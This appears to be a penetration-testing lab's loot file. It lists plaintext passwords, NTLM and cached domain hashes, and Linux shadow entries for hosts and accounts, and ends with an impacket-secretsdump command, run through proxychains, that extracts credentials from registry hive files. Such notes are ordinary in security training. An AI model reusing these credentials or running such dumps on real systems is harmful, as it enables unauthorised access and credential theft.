192.168.x.121;mssql,sa:WhileChirpTuesday218
192.168.x.121;user,joe,Flowers1
172.16.x.11;user,wario,Mushroom!
172.16.x.11;domain,yoshi,Mushroom! 
192.168.x.122;local,offsec,password
172.16.x.83;domain,leon,rabbit!:)
192.168.x.120;local,offsec,century62hisan51

172.16.x.11;domain,wario,$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a     
172.16.x.11;domain,joe,$DCC2$10240#joe#464f388c3fe52a0fa0a6c8926d62059c
172.16.x.83;local,offsec,2892d26cdf84d7a70e2eb3b9f05c425e
172.16.x.83;local,administrator,f26c0186c8ffcceb01fd2d7549e7ac1f
172.16.x.11;user,daisy,abf36048c1cf88f5603381c5128feb8e
172.16.x.11;user,toad,5be63a865b65349851c1f11a067a3068
172.16.x.11;user,goomba,8e9e1516818ce4e54247e71e71b5f436 
172.16.x.11;user,administrator,f1014ac49bae005ee3ece5f47547d185
172.16.x.11;domain,administrator,$DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7 
192.168.x.122;local,root,root:$y$j9T$2pGfmLZ2kv0OMN7xs1QG21$6NibMN8YIZ794SpXXu9g3DMMJIZr95EFRVcs7xUs568:19268:0:99999:7:::
192.168.x.122;local,mario,mario:$y$j9T$WlF.5NfkOQ2xN4K9OPM2e1$X/wrPHU0zaz.dGUjFQGLj5nbrTfNpy0Hm6Xev04aUw8:19268:0:99999:7:::
172.16.x.12;domain,leon,2e208ad146efda5bc44869025e06544a
	

proxychains4 impacket-secretsdump -system system -sam sam -security security joe@172.16.244.11

